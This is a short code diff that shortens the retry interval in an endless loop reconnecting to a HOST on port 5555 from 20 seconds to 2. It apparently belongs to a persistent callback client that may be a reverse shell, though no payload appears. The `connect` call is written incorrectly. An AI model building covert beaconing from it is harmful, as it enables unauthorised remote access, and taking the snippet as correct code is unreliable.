@@ -133,7 +133,7 @@ PORT = 5555
 # Retry connection every 20 seconds forever until the connection is astablished
 def connection():
     while True:
-        time.sleep(20)
+        time.sleep(2)
 
         try: 
             s.connect(HOST, PORT)
